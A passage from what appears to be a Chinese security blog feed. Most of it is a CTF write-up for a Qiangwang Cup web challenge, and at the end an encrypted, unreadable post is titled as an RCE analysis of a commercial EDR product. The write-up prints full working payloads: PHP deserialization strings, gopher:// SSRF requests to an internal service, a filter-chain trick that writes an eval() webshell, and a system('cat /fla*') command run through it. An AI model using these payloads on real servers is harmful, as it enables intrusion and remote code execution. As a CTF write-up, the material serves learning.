class="line">&#125;</div></pre></td></tr></table></figure><p>第一步需要读出ssrf.php，在这卡了好久</p><p>首先：</p><p>尝试传入<code>x=O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}</code></p><p>过程如下：</p><p>触发User对象的<code>__destruct</code>方法，从而调用Pass对象的read方法，<code>ob_start()</code>开启缓冲区，这时<code>global $result</code>结果为NULL，<code>print $result</code>的内容被输入到缓冲区，接着将ssrf.php的内容通过<code>$GLOBALS[&#39;flag&#39;]</code>写入<code>$result</code>，<code>ob_end_clean()</code>清空并关闭缓冲区</p><p>可以看到整个过程是不会有任何输出的，所以这里如果想输出ssrf.php文件的内容，需要突破两个限制：</p><p>1、如何再次调用一次<code>$student-&gt;$boy()</code></p><p>2、如何在再次调用<code>$student-&gt;$boy()</code>时绕过后面的<code>ob_end_clean()</code></p><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age,$sex,$num;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($num=<span class="string">"result"</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;age=<span class="keyword">new</span> Pass();</div><div class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="string">"read"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;num=$num;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a=arrar(<span class="keyword">new</span> User(),<span class="keyword">new</span> User(<span class="string">"this"</span>));</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>1、通过两次反序列化可以再次调用<code>$student-&gt;$boy()</code><br>2、第二次反序列化时，将<code>$num</code>属性设置为this，使其在<code>global $$a</code>的位置报错，导致程序终止，这样<code>ob_end_clean()</code>就不会执行了，于是就可以输出第一次反序列化经过<code>$GLOBALS[&#39;flag&#39;]</code>设置后的<code>$result</code></p><p>传入</p><pre><code>x=a:2:{i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}i:1;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:4:&quot;this&quot;;}}</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/aOYsDFELeBcd.png?imageslim" alt="mark"></p><p>获取ssrf.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></div><div class="line">    $url = $_GET[<span class="string">'we_have_done_ssrf_here_could_you_help_to_continue_it'</span>] ?? <span class="keyword">false</span>; </div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag|var|apache|conf|proc|log/i"</span> ,$url))&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">""</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($url)</div><div class="line">    &#123; </div><div class="line"></div><div class="line">            $ch = curl_init(); </div><div class="line">            curl_setopt($ch, CURLOPT_URL, $url); </div><div class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">1</span>);</div><div class="line">            curl_exec($ch);</div><div class="line">            curl_close($ch); </div><div class="line"></div><div class="line">     &#125; </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>根据源码提示对本机35000-50000的端口进行探测，发现40000端口存在应用</p><p><img src="http://pic.c1imber.top/blog/20200824/K80ryB3jVD0N.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200824/f60jzbD31hHy.png?imageslim" alt="mark"></p><p>根据题目的提示和页面源码</p><p><img src="http://pic.c1imber.top/blog/20200824/kq6HHR8tCuAq.png?imageslim" alt="mark"></p><p>这里需要使用gopher协议通过POST传递一些参数过去</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%252022%250d%250a%250d%250afile%3d11.txt%26content%3d11</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/yAEe0xoHsuLz.png?imageslim" alt="mark"></p><p>经过测试是写到了<code>uploads/sessionid/$_POST[&#39;file&#39;]</code>这个文件里面</p><p><img src="http://pic.c1imber.top/blog/20200824/XsqHaaoncvUH.png?imageslim" alt="mark"></p><p>写shell的时候有点坑</p><p>经过多次尝试，最终通过<code>php://filter</code>协议base64二次编码可以写入成功</p><p>写入shell内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>]);<span class="comment">//1</span></div></pre></td></tr></table></figure><p>payload</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%2520136%250d%250a%250d%250afile%253dphp%253a//filter/convert.base64-decode%257cconvert.base64-decode/resource%253dread.php%2526content%253dUEQ5d2FIQWdRR1YyWVd3b0pGOUhSVlJiTVYwcE95OHZNUT09</code></pre><p>读取flag</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/41i9gt47v4bkahds3n47m1spn4/read.php?1=system(&apos;cat%2520/fla*&apos;);</code></pre><p>因为we_have_done_ssrf_here_could_you_help_to_continue_it当中不能有flag字符，用linux通配符绕过</p><p><img src="http://pic.c1imber.top/blog/20200825/yirAe72NYofF.png?imageslim" alt="mark"></p><p>读取内网系统的index.php看看过滤了什么</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/41i9gt47v4bkahds3n47m1spn4/read.php?1=system(&apos;cat%2520../../index.php&apos;);</code></pre><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">#ini_set('display_errors', 'on');</span></div><div class="line"></div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'del.php'</span>);</div><div class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</div><div class="line">$id=session_id();</div><div class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</div><div class="line"></div><div class="line">chdir($upload_dir);</div><div class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</div><div class="line"><span class="keyword">foreach</span> (glob(getcwd().<span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</div><div class="line">        <span class="keyword">if</span> (is_file($file)) &#123;</div><div class="line">                unlink($file);</div><div class="line">        &#125;</div><div class="line"></div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">200</span>) &#123;</div><div class="line">            Delete($file);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$data = <span class="string">""</span>;</div><div class="line">$filename = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]) ) &#123;</div><div class="line">$filename = $_POST[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'..'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($filename, <span class="string">'BE'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'write'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'zlib'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'sto'</span>)  === <span class="keyword">false</span>)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</div><div class="line">            $data = $_POST[<span class="string">'content'</span>];</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   &amp;&amp;stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ph'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'Pz4='</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'='</span>)  === <span class="keyword">false</span>) &#123;</div><div class="line">                file_put_contents($filename, $data);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; </div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>可以看到过滤了很多字符，其中包括PD9wa，这也是为什么要进行二次base64编码的原因，因为如果对&lt;?php xxx?&gt;进行一次base64编码，结果一定是PD9wa开头的，导致写不进去，另外还过滤了很多字符，需要多次尝试才能写入</p><p>其实这道题通过一次base64编码也是可以写进去的</p><p><img src="http://pic.c1imber.top/blog/20200825/YIqCW06UXkSN.png?imageslim" alt="mark"></p><p><code>1&lt;?php @eval($_GET[1]);//aa</code>这段php代码经过一次base64后也不会出现不允许的字符</p><p>一次base64写入</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%2520102%250d%250a%250d%250afile%253dphp%253a//filter/convert.base64-decode/resource%253dread.php%2526content%253dMTw%252fcGhwIEBldmFsKCRfR0VUWzFdKTsvL2Fh</code></pre><p><img src="http://pic.c1imber.top/blog/20200825/UXAdoetg1Ak6.png?imageslim" alt="mark"></p><p>也可以成功获取flag</p><p><img src="http://pic.c1imber.top/blog/20200825/r3tj8yI4iXiE.png?imageslim" alt="mark"></p><p>但是做题的时候并不知道这个黑名单，也很难想到</p><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;没做出几道题，记录一下吧，周末两天的做题还是有收获的&lt;/p&gt;
&lt;h1 id=&quot;强网先锋&quot;&gt;&lt;a href=&quot;#强网先锋&quot; class=&quot;headerlink&quot; title=&quot;强网先锋&quot;&gt;&lt;/a&gt;强网先锋&lt;/h1&gt;&lt;h3 id=&quot;web辅助&quot;&gt;&lt;a href=&quot;#web辅助&quot;
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>深信服EDR RCE分析</title>
    <link href="https://c1aysec.github.io/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20RCE%E5%88%86%E6%9E%90/"/>
    <id>https://c1aysec.github.io/2020/08/18/深信服EDR RCE分析/</id>
    <published>2020-08-18T09:10:49.337Z</published>
    <updated>2020-08-18T09:33:31.954Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e132e726f79486f47d91b6a64045b5636dda1d0234d11891e66ff6ff62e3c46e">feafb5f2b354fdb50f7dedc1cd80c9a90a50852c14877ca558b6679350685b375fb2b7981bf271516e6885187e601a4b04b1ddfb930c7176c3ecc4a8d5e9c342a73f5a2a95008c83f09a8a51cab383fc171218908fcae049c502e3c9f9e394886b4329b1555368fe08a21578234f8bf0e82441cc32402e7b428c2be24a0735ede8567b91c9f9efc0a430c346468d88c8a5bbe517e3b35fc0b0d8dcd86d5214b515624eb3b883d4a49e4f5aea5235de098154d05445e5d69b4939e8a7552ad03be17f002a16c2d9fb422773a9db85b5ceb1b51786acb51ff2cec0adcf1d659bf68cc380803712036738eb137a130fbd47007b7e68242ec9c10e1b62809fe5578b69b667fae90b05b1468f3d7e52d74a6b1aa172072d3604f1d3d97b0df9f313cdb19f8f4ba49e91db01623b5b5bcb8a842512abb4614f2b85040e885993d44d78dbf53d2546c0743810a1aedb60b8417f6e9e1495c32034681cb1ba37fed4dabdfbfe2326399449f1cdbf188ccd4e7065484f218a3adbc3ed8b22a49f2c83729a9d2f3f2d6936964610f6979279f782e8b71a35a795ee6012c295aa9d27cae518a9ebede57a9c2604165f9e29b9c8fed61430fb45c8266fdd5660b111109a193af61048492564862a8ad312c6b124bd2635bf003201ac9eaa131342fb47ace5f5473dde8fb5ec34b8158856afc3c5a177b9de80bb465354c2881df2032f4ca560be8882e35491409e3091ba2e679cc0eab749c68c9d55fde74a3c6f7a614d56c48315c102beb04faa1a56680eb13f66c2b3800ce4911668ab3a438b7fc538a82c193d9baf2efafd81db2cfbfff0176e083b84a11bdaa06912970a3ca11f10c340d452dea374502a92c6a06855ab957d6deae35f287d05a1162fe17c046e43b75165309025669aa4d410c4278f754755ad59f3be5bc0b3966c2b657e08235c573153528202e32c64d184c51d8929ed3e1d55af0f716a17e5e40ac7b9f894e82a41220ef5da1a33ef97618b6975050da661cd7e9319a74dd96cb08fa9a1d3d81861bc85b022c208ad74b0e44006d9eb98966210da4e63a6052eaa6180d2f22b62f93cf6150d70c2e3b6cebb503b7f2d52e7b2cd97c16865055afe5c3ef0963c911ea7e30a44546176e66bf08d46c3301d035a8dd87ad96d6ac0e2bba9544aad8575833bb7f4bb3c21fa2b4f9288a5de4332a3e30e3638bf37849cb0d9cf683deada48b3f4863b6a1e943e6a0940c3d799a2c1a6aef532103ccb95906bbedd5c79b52d88db917e7370df93257c179a4f33e1d5079b96a245bdd07a895b5dfe4b57cf41031c22a98810ea1d5e3e430c40bc3d73f614ff9abf58af254d835aaa4031cf20ec01bea7073351b98c8a9c6a81ddcc25593c031b311056bd8a7d17b0a828e72970021779bcd9b3a1ca4edf7f32e0d04764fce518a38e5e95797d08b1e633ccb5a44045279efc5289ba600043aab9738aeeeafb015a70e2cfa30857e756b473a2dc428d7117ae4b9fec38106ec0a89d1f92015e822f7c1120f523db58b1cfe8e58beb5ff530df07dee94b00fa46c15b3387e077979f67d4e883e3606e36a19c9522a538b09d89ae6a31f59a9a456f7c0392e79e21150182ef410a8a74171d5a5d32fdd2adb4ceb547ab9d7ef8aaaed7555b3a0c5eb40ae2297ab1c1511391734ed05d18a1857d2a34cc865951000f2df1d8d7683cfcf91b13f7f01010fc865bef31a5ab5454891db1a6150a1ea13a3dc69c7925feca7dcc1e4e37344a3719f324fe332e65eef4f2d0dddecf7d7e3c456ef5c639792d92faa918b754b117e7d9e2a5a10e97b791d43df5b0f8d2f03e7f6306db1d645763c26c7332dcb5377ddbe0c4f74b13305d6ced0f30599066ac0e45d1e48c6a28578590866245f5addac14d1241034fcc4dd54179ee9fff7403387e429b23db228ce062aa30b3a73c05d0c30dcc89927e37d63d9148ad7037d7e71cec28a3388d81b8ec897521512bfa9258468f22bf71c8d19ce348bebe35cbdc64df42a248fcd57597432d99de187ae886312729ab7f342479b9a91ca99328c0f0e7d1721bd3741d4724bec3ebda5f4a449f6652bee8b537dc5dfe2212822491969cd6efe4c14be73c4d680d38e6945f316f1643ec92fedbb6b998c012f7f2b0afed6e359608f7fd19f5e805677c781743067e98292171ee0ca9300ce512341fbfe2b0b820d41da04f52953a577bea32cdffbe33a6f3398054011d9826c8dd20cede1f1ce8cf66184d8d5ee3caac71b10430c70ab94f72ced870a703d1acce13a7f888083bbd207bcfeb9958125ab1d21dfa97f46f3fc794b5d14176dcb2d8b2f6b017661fb52cf20710ae628b70c944e8dd0f5ddd4e6a42261d8ac4027eacaeca432709f9c13fbb82b4fc82a7ed26e70579c5d3d4e5c21d97ba9197feb6fc169ce2d79cf806a48838701db51b98d62664fc001eb74ccfccf18a8b42c55cbc06f9c4a57e77605ed0f566c9413dabe3ba08d94b3c23f96267c26d5fa68a078d818b2ab761c3f0b90447c439130163484197fbddf1b0ab0eef63bd6cf0aa4928c44274f5fa4c9fa1195b3ac4efcfbd059c71b622a003248d7ecd0f04bcbead5e1cd619f076fe354abea031610a4fc76cba63780400160a97b55b8e8a247bfdfed7f08b1745d51f540996ab87aa890dfe6a92a3503e9d1cfdcc34ee0ce8697a992c77aab39b5b8232b657e13f43eef2ebd3a390dbdd5b7eff36e7abad70cd7a9752e4ac5264fee62733bbb106d2951672d028084d5abe2170529ee320c5e94ca2013b54a31a3f5e7afdd0591b2106ebbee9904785452cfbc9e770877777cf0d5e2b3bfc7c1a421f3e9eaf707e8a693672893b397b35e53dd7ed2fb636d239d37145043754faecb84cd62c7ebbc927b723afe416d4bc81fcf27a13c2845bcb42393f3f1ff6d0b1d176e0a5e37070c1ba8e765c2c1b087aeeb9ed692a159db45ba3fee5db37e3d66a113f45d8166dfd1e0bdeeca7b0ba78680bb736c656e6faf742d51b3e5cf2c59509ad0860bb6502ffed0509e265c4df1a1fafc7b3ea2c3245c08a1d7700e737643bd94083c8c65821bcda39763dc36f8dc694ff0f2ac8c4d28daa9bf10de65e03d9d3484892ed890440c2f5be45da6de50cdcc6d05418f66217653d6be50b441da5b2987adc826b9aed0ac0a42d046c90d3f24a9367cbcbfb94b6dedbb22840b2a41d0d3b7379c9bf09a0d188eea0a3fd31d0988d6d67ef88bd768cba973dd6cfe861f836f77efb353c70d57aac918bf8405cad359ff7059e9f444bada4cdb7332e188043367cb9458b02763650b619e1cbf874fae81ff50f0080fc0c2baf5ed70d3549e3aad319d5edaff1d065c38c2e4f8e1f241802ed1ffbbfe65fc5c6a85bab141c3b9f4d4398b9465d7d12e515884a3f6d24fdf37d7a5bdebf7aca4ec76af2a336b11e82aded0204f728e98bdbddc06b85296313d460b53cc65879ebe9f64ee9fe8069be7bf013606a839978771be596340c5a128b08f1dc080cc1897f7b22553589096744f965ca8bea8b850b6d30fc755fa2ef6c21fd6a4081c611005ded3469447611e97e2eb005c9470c98274f89c3f5d9a1bb40f96d8df2d15ec7b1370371c6d04db7e9ab0b2d8cdcbb0cbbdd2c1fe0f9e1cf5ab9be3ec761a114c7d2a3493eb297c4e75768758659976a81186cf0ff12b6e39a68808376cac93f447b4db1b9d5228838e95b3395993a00f1f2a1bae37e639447b30f11bce2a3691eaf26acb4b86aba1e737dd90bfdd9f0cc7b1a2c4fec9ad5ebf23ae73fce5c3ed9af191090f087fcd31aa5fc0603e18aaf19d17706fb226a3f1f17cf9843f5f90573b71b240d2b2b8ce224d6f163fbcf2d3940e21b379763cdd4900f7d8103d2cf90cfedf5b6dd58b1cc6f6838477327be7846ac42b7a307432ecfa5c12974611b98c892e64124e58a10d517536cb8f55f89c850c5f1ddd905c84879e42bc7ab23b597321df2a2014c384dbeb67c2fc630e17775e5136e0503ebfee7fae1491f1b1607b59e518bc5c0fe0ad37a4848c1f1af944609be049d0ed96e147dee02812f98ff2e9466a5cbd4f5ead873c599141083abaa36fb5d66b6ec66788d4c9f5551ba61fd7ab2ea10aa8ea9bc90c3f445d3646af364e426e45f6ff4c2a46ff92a21aa6672c816788dd36a17e64aa719d77429ed38ae1008004e686ea4b6d9c18f036cf4592f51305e64dc5060a3e3eeaccaf01df9a092fd256d01084e5ede148203508ca4cb906d9cb25d40982931f9e9906f19849b19290f94c76b4a4d9838d43f660c77cd422d95368b91fdb25191730b10fdaf4e09f745d0ea03f532471519162defe70fac25beac1463ba6a7444efd8e2ea9e3e44917330a5c6841c9db43b7bb32fc3ac81edfb9dd2505949d94f05bd7a7740326e8f9fdb27c9665febc475a11542bad65ef8adab87fa4f8fbf44e46e93cf5db1949972db63ef11dc5929a6b8344eb605818806192d4bbfad6e0d4eb88b5f4b874d4cffbf13e5967e450f1b2b00ae50842b45f3c8b702f8a20cece20d14e6da2fabd9462c4c2db7a9ae119b52bbdfacc85d3677b6332590a779871fb8b94aa7c841fe7a4ddb310d5f0966c589568c5dbc81e416076ef9a260c7a6c0ee690258c8e6afeb36716b80e307af6a6abb8fc0d1fdb94cedcd7513889a3947d5c9634d825a448187c433be2b5f1d5ae86171a7c3912ee147311056cb1181b3741287ae3ed48fb647fbbc31c8ad646ffd5a92d1df954cf21a8c432b79a742d2eafb86ad6b07398eba70ea4fe1c6f7d8885ce482444df7b88d4b2a16805ff4ad0dae4dbfa4609c37feb97eab4770832016aa4d92ddc958548730549e69025c2e713c5ea818e2e0a882d6d022d689026d93f402be356d0c2f9eefbc450a559ae65807b5f6938dc6f8148f2681d4a14539128aff59698428e31f42f3ad7377e814b1fa46998b4d721ab550f42539b2b2e8eb0c5e8dad09caa54ddb2b0dee68f5fc4fa6649ff67a0dfef868ebfce16564e86a20c6c5b856f0adcca766a6b95f0cd1405e59e21f2716feb7a97948a96bb5f2bcd654dbef8b7f22926e63728a0bbd87deb04541f6d9854689b5fb23de014894e7c5dcd4c3719c79f4bce15636c9e060477e6e8b8497cf272d62200a23d165c508c3a232ac46608453c02b9389435a3fe8c48bddd5460b389e312cc699a7f2cb293a3324cbe6afbef6885c6771c555c8ccc6ae70812444d60cb42cf3376ea97c8e25c86b9d73c54c67b9f340ddd7647eb31b6cde6590a6c84653dc04fac3c323fb3486a1b75dd38b2e8859522512ad3a16c1b3005ec623670e4463a0db402ea8aaf56325e78127ae2933c6ed795b22072879a41641860aec6b8b46713bb442dcdf4b06ee33181996fafc1e2636b61f224533a19064849ff81061cbc2dd61ac3f038bbab0938bebc19c46d963ffa01313ec91a1b1e9fa598f1643a85e0f433fa407abef6c367acb2ff43341650c6126084fa74d69353bb81b3056fafa0766f3163ab7f277a78a2c307e771638bfde705a2b34fe573c884bb44cf80ab77dce5c80a08324eeeeb1ca46de95f09a6f9529a5a1c2a49ec3fbbc6e72e9c00623745475502b6608981d04af60b0156083d296f3ff62019430fa9abd8dd9ee8732dd0733f4bdc254bfc6ea5d56a8eddfcc083728f09a3039d63aee2ee1b76d628b891d5d554ec9f48410dd70a01331033794475f7f5cb29e152687e242f306310a2edcd5bc75b978d140a5f6dd66fc00c03daaa360bb24e3af91514e89f77f73161fb0f27f3a9bbb3f021f81d5ecd9a83893c48eaf18e4de47ed10b0211af57509d38a0035cec10d1257f160cc410a68d2e6503e24fa49924fcaa0004407df3616fad8452cd34adcca4221ae928c3cdfd99a3788cb78485ee02a4ba9bbbae1c153c48d811d0e17f6f6efb96a92306980e7fd0f329ff6ee93b6c07fda921ac0871af9baad5ada66b9d79a890e05ce878783cbbd34f4b75b7a80c28f1aa6b0d2a08a53a72624be7b26558bfaced304879a3f97c1fa40019b3a09d0fafaa470629d097a264acdb6ce9f5143e3c3ddbc78bf079d438bb87dd388083de668017579ee1cec7809d5c892ab28af78140add3486be5ddc3c1d001c742f6193bda16217095ab158f2e308920eadab8b13d2a18df209aac93ed991bad1b713fc1e86745de2ede7b620fe17d4f9a69d915d9157ad1dfdf500c0a4d2ce1d23a9b749f11937aa3a857956e34d79452120ff6c21cd4576f86da15fa0f713681be71b21e01d86c1be5ccd2e00484c42c264ecf32c771566f7455ffa17f15de0cde68a3ba2c6580dedc0da47e216d6c517f2d9e70982ce6cc089757f52469f99c3e235bb5323ecb4c2a85c0598fbcac73329a42a66b59a6c2abc4749e186521e3cd35ed2aa85db96885c0deb483d778911479229216a341b5c430a750ee819206f3f98bfa09cc2a468e68342220969d638237253f088404354000802abfa6ea18a5ce46ad345cbcd880de898070f20f3bbe195cf5313ae79fe01e8a74eee61a90d6a0c55f1c93f1c721210e2867548cbed228925640773b749630a00075d34256ee483638ef6be665e0814b3330d8bcc55202bbf1288faa3ef3ed9ee57fec6c05acb421098e85ab3614454fe858ce8e15ff08a1db50d64180cbe90beab4a32a1c39d98d3fd494f0fa2b8b5f73d2160dec3c849c7dc41c4e02b794940adb218cff65cf5b2211e14d71168e833155b0dc6102a077f78a3663636d1ce2ba6368f91ebeb6a919c17ec82c1e5eae51c3fec6522bc3038d034a1a4b5c48dddf038dd6bcd4c7d1affe6c3a0fda5046a0354797f8b82b91d88d0f512823942d363b5879b890cd512295ed31671864081ec01639d4eed02b616a23df077d33ff41d42235cb3601978f0c0a76b51c61154a3b3b8715d5e2544aa7488e556da06b7bf69d2f65233c5fc22ce88922146640a2c0de6ded0998bca21de33e95bd5ec541eede2a5f9f5d2038326e660354cd8cc58319649b078344bca2da0d357485de26714ba640e4efb85687d72747b6001756ed709c72befd2ad4e8b2f6c78c2c06148a34fb8b206439ed596529daa372ea4cb3b718e66e7dfb9056051d1fcb8e7dd30292a6f85c2e6adf2a3750dd42081113de13bea580ccb29b7cb192ffe2fe38c442d643a177c6f246417465f4f8fce492644fd41aaead1f1f3c132dd59e6f2ff439cd983af9a4efbe6bf6788adb6e581648fb46676071ba95a8ce2323d646ff9d07f5139e7ba0b343dddb297aecacc312aa6dc9bba2cb8d5768161ae6603d1ce2cb63bfe525d9331be642ee850c2a43a16a0065ab47826159f2d1d428ada45ba8c199dd0d2d99b4e6960ced10dfbacece4e6fffc073f44a6e2b05a93e721cafa2c80417351a060c273d06568523efdd3445a6c672c991e50c1180ad739de719da316768f295d4c0f95ae3261d0af55f7700e31c8cd322122cbf17784d61c79c65a64225f7629995d9d1973235aa3d857136012a0d2a1cafa0f65367242bf2ad7f2af940f9c5bb1d70eba6c4f3b088ae3c7b833ca7e1d049eb56826050fca6e2cd3605bf679ef6ddcb5a70397aaa73a51fe6672147c79bccc5cff33cf34cd8a72632112276bc0207bb7bf5bc2359e012eb2e9d7585420c2f64d3caa061eac3416be421fb1a7bb19e73a91e934a52679b6c470e5c1b6bd86a9f630afb510d8437eeb79bed0040735965805b31507bd9565f45a46cfc71ff75808e75aaf3d2b46a815a089b51a8801e0d310f79c5f2d7a52ce178827ed58a735ddf4c298165b4